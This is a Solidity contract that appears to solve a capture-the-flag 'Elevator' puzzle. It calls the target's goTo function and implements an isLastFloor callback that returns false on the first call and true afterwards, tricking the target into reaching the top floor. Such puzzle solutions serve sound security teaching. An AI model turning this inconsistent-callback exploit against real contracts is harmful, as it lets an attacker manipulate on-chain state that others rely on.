// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorChallenge {
    IElevator public elevator;
    uint256 private callCount;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function attack() external {
        elevator.goTo(10);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        if (callCount == 0) {
            callCount += 1;
            return false;
        } else {
            return true;
        }
    }
}
